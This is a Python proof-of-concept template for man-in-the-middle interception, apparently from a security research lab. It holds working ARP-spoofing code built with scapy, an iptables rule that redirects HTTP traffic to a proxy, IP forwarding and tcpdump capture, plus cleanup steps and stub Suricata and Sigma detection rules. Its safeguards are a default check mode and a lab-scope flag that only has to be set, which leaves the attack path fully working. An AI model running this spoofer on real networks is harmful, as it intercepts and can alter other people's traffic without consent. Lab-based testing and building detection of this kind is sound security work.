#!/usr/bin/env python3
"""
MITM / Intercept PoC Template (Lab-Contained)
=============================================

This template is the default starting point for "MITM / intercept / traffic manipulation"
PoCs in this lab. It is designed to be:

- Lab-contained (prefer Docker/VM harness)
- Safe-by-default (`--mode check`)
- Single-target scoped (explicit victim + target allowlist)
- Evidence-driven (pcap + before/after diff + JSON output)
- Cleanup-first (restore ARP / iptables / forwarding)

References:
  - 04_POC_GENERATION_PROTOCOL.md (MITM/Intercept standard)
  - 08_SAFETY_OVERRIDES.md (scope + cleanup)
  - 10_DEFENSIVE_DETECTION_PROTOCOL.md (detection pack + validation)
  - 11_REPORTING_STANDARD.md (evidence index)
  - 12_ENGAGEMENT_OPSEC_WORKFLOW.md (red↔blue loop)

Category: PoC (Network) - MITM / Interception
Author: Security Research Lab
Version: 1.0.0
Date: 2026-05-07
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import signal
import subprocess
import sys
import time
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Optional


class PocResult(str, Enum):
    VULNERABLE = "VULNERABLE"          # interception succeeded
    NOT_VULNERABLE = "NOT_VULNERABLE"  # interception not achieved
    UNKNOWN = "UNKNOWN"
    ERROR = "ERROR"


@dataclass
class EvidencePaths:
    base_dir: Path
    pcap: Path
    before_after: Path
    run_log: Path
    result_json: Path
    detection_dir: Path


def _run(cmd: list[str], timeout: int = 30, check: bool = False) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=check)


def _which(tool: str) -> bool:
    return shutil.which(tool) is not None


def _require_root_or_die() -> None:
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("[-] Root required for L2 MITM (ARP/iptables). Run with sudo.", file=sys.stderr)
        sys.exit(2)


def _enable_ip_forwarding(enable: bool) -> None:
    # Linux default; in Docker attacker container this is typical.
    path = Path("/proc/sys/net/ipv4/ip_forward")
    if path.exists():
        path.write_text("1" if enable else "0")


def _iptables(args: list[str]) -> None:
    if not _which("iptables"):
        raise RuntimeError("iptables not found (install iptables in attacker environment)")
    _run(["iptables", *args], timeout=10, check=True)


class ArpSpoofer:
    """
    Simple single-pair ARP spoofer.

    NOTE: This is intentionally minimal and lab-scoped. In real PoCs, you typically:
    - run inside a lab harness container attached to the victim/target L2 domain
    - enforce victim+target allowlist
    - restore ARP in cleanup
    """

    def __init__(self, iface: str, victim_ip: str, target_ip: str, interval: float = 1.0):
        self.iface = iface
        self.victim_ip = victim_ip
        self.target_ip = target_ip
        self.interval = interval
        self._running = False

    def start(self) -> None:
        try:
            from scapy.all import ARP, Ether, sendp  # type: ignore
        except Exception as e:
            raise RuntimeError(f"scapy required for ARP spoofing: {e}")

        self._running = True

        # We do not resolve MACs here to keep template short; real PoC should resolve and validate.
        pkt_victim = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=self.victim_ip, psrc=self.target_ip)
        pkt_target = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=self.target_ip, psrc=self.victim_ip)

        while self._running:
            sendp(pkt_victim, iface=self.iface, verbose=False)
            sendp(pkt_target, iface=self.iface, verbose=False)
            time.sleep(self.interval)

    def stop(self) -> None:
        self._running = False


class TcpdumpCapture:
    def __init__(self, iface: str, pcap_path: Path, bpf: str):
        self.iface = iface
        self.pcap_path = pcap_path
        self.bpf = bpf
        self.proc: Optional[subprocess.Popen] = None

    def start(self) -> None:
        if not _which("tcpdump"):
            raise RuntimeError("tcpdump not found (install tcpdump in attacker environment)")
        self.pcap_path.parent.mkdir(parents=True, exist_ok=True)
        cmd = ["tcpdump", "-i", self.iface, "-w", str(self.pcap_path), self.bpf]
        self.proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def stop(self) -> None:
        if not self.proc:
            return
        self.proc.terminate()
        try:
            self.proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            self.proc.kill()
        self.proc = None


class MitmInterceptPoC:
    """
    MITM PoC lifecycle:
      - check: verify tools + environment prerequisites
      - intercept: perform L2 MITM and optional transparent proxying
      - verify: demonstrate before/after (marker header/body) + pcap exists
      - cleanup: restore forwarding + iptables + stop background processes
    """

    def __init__(self, victim: str, target: str, iface: str, options: dict):
        self.victim = victim
        self.target = target
        self.iface = iface
        self.options = options
        self.result = PocResult.UNKNOWN
        self.evidence: list[str] = []
        self.artifacts: list[str] = []

        self._spoofer: Optional[ArpSpoofer] = None
        self._spoofer_pid: Optional[int] = None
        self._capture: Optional[TcpdumpCapture] = None

        self.evidence_paths = self._init_evidence_paths()

    def _init_evidence_paths(self) -> EvidencePaths:
        base = Path(self.options.get("evidence_dir", "evidence")).resolve()
        return EvidencePaths(
            base_dir=base,
            pcap=base / "traffic.pcapng",
            before_after=base / "before_after.txt",
            run_log=base / "run.log",
            result_json=base / "result.json",
            detection_dir=base / "detection",
        )

    def add_evidence(self, s: str) -> None:
        self.evidence.append(s)

    def check(self) -> bool:
        if not self.options.get("confirm_lab_scope"):
            print("[-] Missing --confirm-lab-scope (required).", file=sys.stderr)
            return False
        if not _which("tcpdump"):
            print("[!] tcpdump not found (pcap evidence will be unavailable)", file=sys.stderr)
        if self.options.get("use_arp_spoof") and not _which("python3"):
            print("[-] python3 missing", file=sys.stderr)
            return False
        return True

    def intercept(self) -> dict:
        _require_root_or_die()

        # Start capture
        bpf = f"host {self.victim} or host {self.target}"
        self._capture = TcpdumpCapture(self.iface, self.evidence_paths.pcap, bpf)
        self._capture.start()
        self.artifacts.append(str(self.evidence_paths.pcap))

        # Enable forwarding
        _enable_ip_forwarding(True)
        self.artifacts.append("/proc/sys/net/ipv4/ip_forward")

        # Optional: transparent proxy wiring (mitmproxy in separate process)
        # This template keeps it as a stub, to be filled by the specific PoC.
        if self.options.get("transparent_proxy"):
            # Example iptables redirection (HTTP only):
            # iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
            _iptables(["-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", str(self.options.get("proxy_port", 8080))])
            self.artifacts.append("iptables:nat:PREROUTING:http_redirect")

        # Optional: ARP spoof (single pair)
        if self.options.get("use_arp_spoof"):
            self._spoofer = ArpSpoofer(self.iface, self.victim, self.target, interval=self.options.get("arp_interval", 1.0))
            pid = os.fork()
            if pid == 0:
                try:
                    self._spoofer.start()
                except Exception:
                    pass
                os._exit(0)
            self._spoofer_pid = pid
            self.artifacts.append(f"arp_spoofer_pid:{pid}")

        # Real PoC should now generate victim traffic and demonstrate modification.
        # Here we just hold a small window so capture sees traffic if present.
        time.sleep(self.options.get("hold_seconds", 8))

        return {"success": True, "details": {"pcap": str(self.evidence_paths.pcap)}}

    def verify(self, intercept_result: dict) -> bool:
        pcap_ok = self.evidence_paths.pcap.exists() and self.evidence_paths.pcap.stat().st_size > 0
        if pcap_ok:
            self.add_evidence(f"PCAP captured: {self.evidence_paths.pcap}")
        else:
            self.add_evidence("PCAP not captured (tcpdump missing or no traffic)")

        # For real-case verification, the PoC should also write before/after diffs.
        if self.evidence_paths.before_after.exists():
            self.add_evidence(f"Before/after diff: {self.evidence_paths.before_after}")

        return bool(intercept_result.get("success") and pcap_ok)

    def cleanup(self) -> None:
        # Stop child spoofer
        if self._spoofer_pid:
            try:
                os.kill(self._spoofer_pid, signal.SIGTERM)
            except Exception:
                pass

        # Stop capture
        if self._capture:
            self._capture.stop()

        # Undo iptables (best-effort)
        if self.options.get("transparent_proxy") and _which("iptables"):
            try:
                _iptables(["-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", str(self.options.get("proxy_port", 8080))])
            except Exception:
                pass

        # Disable forwarding (best-effort)
        try:
            _enable_ip_forwarding(False)
        except Exception:
            pass

    def write_detection_stub(self) -> None:
        """
        Create a detection pack skeleton. Real PoCs should populate this with:
        - Suricata rules for marker headers/bodies
        - Sigma rules for app logs if applicable
        - validation.md describing how to reproduce and confirm triggers
        """
        det = self.evidence_paths.detection_dir
        (det / "suricata").mkdir(parents=True, exist_ok=True)
        (det / "sigma").mkdir(parents=True, exist_ok=True)
        (det / "zeek").mkdir(parents=True, exist_ok=True)

        (det / "suricata" / "rule.rules").write_text(
            "# Suricata rule stub\n"
            "# Add content markers that your MITM injects (e.g., X-Lab-MITM: 1)\n"
            "# alert http any any -> any any (msg:\"LAB MITM marker\"; flow:established,to_client; content:\"X-Lab-MITM\"; http_header; sid:1000001; rev:1;)\n"
        )
        (det / "sigma" / "rule.yml").write_text(
            "title: LAB MITM marker (stub)\n"
            "id: 00000000-0000-0000-0000-000000000000\n"
            "status: experimental\n"
            "description: Detect lab MITM marker in server logs (customize)\n"
            "author: Security Research Lab\n"
            "logsource:\n"
            "  product: linux\n"
            "  service: webserver\n"
            "detection:\n"
            "  selection:\n"
            "    message|contains: \"X-Lab-MITM\"\n"
            "  condition: selection\n"
            "falsepositives:\n"
            "  - Test traffic\n"
            "level: medium\n"
        )
        (det / "validation.md").write_text(
            "## Validation (stub)\n\n"
            "- Run PoC in exploit mode\n"
            "- Confirm pcap exists under evidence/\n"
            "- Confirm Suricata/Sigma rules trigger on marker\n"
        )

    def execute(self, mode: str) -> dict:
        start = datetime.now()
        phases: dict = {}

        ok = self.check()
        phases["check"] = {"completed": True, "ok": ok}
        if not ok:
            self.result = PocResult.ERROR
            return self._finalize(start, phases)

        if mode == "check":
            self.result = PocResult.UNKNOWN
            return self._finalize(start, phases)

        intercept_result = self.intercept()
        phases["intercept"] = {"completed": True, "result": intercept_result}

        verified = self.verify(intercept_result)
        phases["verify"] = {"completed": True, "verified": verified}
        self.result = PocResult.VULNERABLE if verified else PocResult.NOT_VULNERABLE

        if mode == "full":
            self.cleanup()
            phases["cleanup"] = {"completed": True}

        if self.options.get("write_detection_stub"):
            self.write_detection_stub()
            phases["detection"] = {"completed": True, "path": str(self.evidence_paths.detection_dir)}

        return self._finalize(start, phases)

    def _finalize(self, start: datetime, phases: dict) -> dict:
        end = datetime.now()
        out = {
            "mode": self.options.get("mode"),
            "victim": self.victim,
            "target": self.target,
            "iface": self.iface,
            "result": self.result.value,
            "start_time": start.isoformat(),
            "end_time": end.isoformat(),
            "duration": (end - start).total_seconds(),
            "evidence": self.evidence,
            "artifacts": self.artifacts,
            "phases": phases,
        }
        # Always write result JSON if requested
        if self.options.get("output"):
            p = Path(self.options["output"])
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(json.dumps(out, indent=2))
        return out


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="MITM/Intercept PoC Template (Lab-contained)")
    p.add_argument("--mode", choices=["check", "exploit", "full"], default="check")
    p.add_argument("--victim", required=True, help="Victim IP (single target)")
    p.add_argument("--target", required=True, help="Target IP (single target)")
    p.add_argument("--iface", required=True, help="Interface to use (inside harness)")
    p.add_argument("--confirm-lab-scope", action="store_true", help="Required: confirm lab-only scope")
    p.add_argument("--use-arp-spoof", action="store_true", help="Enable ARP spoof (L2 MITM)")
    p.add_argument("--arp-interval", type=float, default=1.0)
    p.add_argument("--transparent-proxy", action="store_true", help="Enable transparent proxy wiring (iptables stub)")
    p.add_argument("--proxy-port", type=int, default=8080)
    p.add_argument("--hold-seconds", type=int, default=8, help="Hold time to capture traffic (template default)")
    p.add_argument("--evidence-dir", default="evidence", help="Evidence directory (default: evidence/)")
    p.add_argument("--output", default="evidence/result.json", help="Write JSON result (default: evidence/result.json)")
    p.add_argument("--write-detection-stub", action="store_true", help="Create detection pack skeleton under evidence/detection/")
    return p


def main() -> None:
    args = build_parser().parse_args()
    poc = MitmInterceptPoC(
        victim=args.victim,
        target=args.target,
        iface=args.iface,
        options={
            "mode": args.mode,
            "confirm_lab_scope": args.confirm_lab_scope,
            "use_arp_spoof": args.use_arp_spoof,
            "arp_interval": args.arp_interval,
            "transparent_proxy": args.transparent_proxy,
            "proxy_port": args.proxy_port,
            "hold_seconds": args.hold_seconds,
            "evidence_dir": args.evidence_dir,
            "output": args.output,
            "write_detection_stub": args.write_detection_stub,
        },
    )
    out = poc.execute(args.mode)
    print(json.dumps(out, indent=2))
    sys.exit(0 if out["result"] in (PocResult.VULNERABLE.value, PocResult.UNKNOWN.value) else 1)


if __name__ == "__main__":
    main()
